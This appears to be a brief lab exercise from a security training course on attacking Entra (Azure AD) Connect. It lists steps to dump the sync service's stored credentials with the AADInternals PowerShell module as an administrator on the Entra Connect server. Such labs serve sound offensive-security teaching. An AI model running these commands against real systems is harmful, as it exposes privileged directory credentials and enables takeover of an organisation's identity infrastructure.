## lab 2 - Entra Connect Attacks
1. Dumping and Extarcting Entra (Azure AD) Connect credentials:
    1. run powershell as admin on the server where Entra Connect is installed
    2. execute:
        ```powershell
        Import-Module AADInternals
        Get-AADIntSyncCredentials
        ```

